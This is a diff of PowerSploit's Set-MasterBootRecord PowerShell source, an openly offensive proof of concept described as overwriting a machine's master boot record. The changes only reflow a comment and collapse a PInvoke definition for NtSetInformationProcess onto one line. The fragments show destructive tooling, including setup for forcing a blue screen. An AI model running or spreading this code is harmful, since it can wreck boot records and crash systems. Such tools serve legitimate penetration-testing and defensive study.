@@ -3,8 +3,7 @@ function Set-MasterBootRecord
 <#
 .SYNOPSIS
 
-    Proof of concept code that overwrites the master boot record with the
-    message of your choice.
+    Proof of concept code that overwrites the master boot record with the message of your choice.
 
     PowerSploit Function: Set-MasterBootRecord
     Author: Matthew Graeber (@mattifestation) and Chris Campbell (@obscuresec)
@@ -319,7 +318,7 @@ Set-CriticalProcess -Force -Verbose
     {
         $Response = $psCmdlet.ShouldContinue('Have you saved all your work?', 'The machine will blue screen when you exit PowerShell.')
     }
-    
+
     if (!$Response)
     {
         return
@@ -331,14 +330,8 @@ Set-CriticalProcess -Force -Verbose
 
     # Define [ntdll]::NtQuerySystemInformation method
     $TypeBuilder = $ModuleBuilder.DefineType('BlueScreen.Win32.ntdll', 'Public, Class')
-    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('NtSetInformationProcess',
-                                                        'ntdll.dll',
-                                                        ([Reflection.MethodAttributes] 'Public, Static'),
-                                                        [Reflection.CallingConventions]::Standard,
-                                                        [Int32],
-                                                        [Type[]] @([IntPtr], [UInt32], [IntPtr].MakeByRefType(), [UInt32]),
-                                                        [Runtime.InteropServices.CallingConvention]::Winapi,
-                                                        [Runtime.InteropServices.CharSet]::Auto)
+
+    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('NtSetInformationProcess', 'ntdll.dll', ([Reflection.MethodAttributes] 'Public, Static'), [Reflection.CallingConventions]::Standard, [Int32], [Type[]] @([IntPtr], [UInt32], [IntPtr].MakeByRefType(), [UInt32]), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
 
     $ntdll = $TypeBuilder.CreateType()
 
